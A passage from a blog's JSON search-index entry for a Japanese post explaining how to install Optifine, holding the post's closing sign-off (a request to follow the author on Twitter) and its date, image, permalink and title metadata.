Twitterもやっていますのでフォローのほどよろしくお願いします。 それでは次回でお会いしましょう!\n","date":"2023-02-07T00:18:24+09:00","image":"https://crysta1221.github.io/p/optifine-intro/optifine_hue2d636a5d8422cfb6977f11fd7eaaa67_3002399_120x120_fill_box_smart1_3.png","permalink":"https://crysta1221.github.io/p/optifine-intro/","title":"Optifine導入解説"}]